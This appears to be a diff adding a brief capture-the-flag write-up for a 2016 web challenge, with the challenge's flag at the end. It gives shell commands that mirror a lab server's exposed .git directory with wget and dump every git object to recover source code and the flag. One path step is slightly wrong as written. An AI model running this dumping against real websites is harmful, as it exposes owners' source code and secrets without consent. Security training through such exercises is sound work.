@@ -1,0 +1,23 @@
+# MCSC Challenge ENSIAS 2016
+# Category: Web
+# Author: Faid Amine
+# Points: 250
+
+Write-up : 
+
+Steps : 
+
+After We found the hidden directory '.git' we should download the directory
+
+root@bt:~ wget -r -nH -e html_extension=Off --reject '*.html*' 'http://10.0.2.2/web1/.git/'
+root@bt:~ cd .git
+root@bt:~ cd /objects/
+root@bt:~ for d in *; do for f in $d/*; do git cat-file -p $d$(basename "$f"); done; done | grep flag.txt
+root@bt:~ for d in *; do for f in $d/*; do git cat-file -p $d$(basename "$f"); done; done | less
+
+And We got the Flag 
+
+MCSC16{You_G!t_My_V3rs!on}
+
+
+# D3siprox
